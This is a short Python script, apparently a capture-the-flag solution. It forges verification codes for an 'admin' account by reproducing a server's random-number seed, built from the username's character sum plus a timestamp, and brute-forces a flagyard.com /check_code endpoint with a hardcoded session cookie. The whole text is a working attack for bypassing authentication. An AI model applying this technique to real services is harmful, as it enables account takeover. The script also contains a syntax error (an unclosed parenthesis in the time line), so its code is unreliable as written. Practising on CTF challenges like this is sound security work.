import time
import string
import random
import requests

def generate_code(username, timestamp):
    """Recreate the server-side code generation logic."""
    space = string.ascii_uppercase + string.digits
    seed = sum(ord(char) for char in username) + timestamp
    random.seed(seed)
    random_part = ''.join(random.choice(space) for _ in range(32))
    return f"{username}_{random_part}"


username = "admin" 
url = "http://a443a1a2fe300e567782b.playat.flagyard.com/check_code" 
cookies = {
    "session": "eyJjb2RlX3ZlcmlmaWVkIjpmYWxzZSwidXNlcm5hbWUiOiJhZG1pbiJ9.Z0cb4A.TY3ZFV4ssnyqUWvqYVnb3iAipYU"  
}
headers = {
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "X-Requested-With": "XMLHttpRequest",
}


current_time = int(time.time()
time_range = 60  

for timestamp in range(current_time - time_range, current_time + time_range):
    code = generate_code(username, timestamp)
    response = requests.post(url, headers=headers, cookies=cookies, data={"code": code})
    
    if response.json().get("success"):
        print(f"[+] Code verified successfully: {code}")
        break
    else:
        print(f"[-] Invalid code: {code}")





